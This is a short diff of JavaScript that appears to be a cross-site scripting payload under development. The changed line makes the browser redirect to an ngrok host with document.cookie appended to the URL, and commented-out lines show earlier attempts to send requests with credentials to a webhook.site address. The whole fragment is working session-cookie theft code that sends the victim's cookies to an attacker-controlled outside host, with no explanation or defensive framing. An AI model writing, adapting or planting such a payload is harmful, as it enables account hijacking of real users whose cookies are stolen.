@@ -7,7 +7,7 @@
 //xhr.open("GET", "https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", true);
 //xhr.withCredentials = true;
 
-window.location = "//2631659f7a0d.ngrok-free.app";
+window.location = "//2631659f7a0d.ngrok-free.app?c="+document.cookie;
   
 //fetch("https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", {
 //  method: "POST",
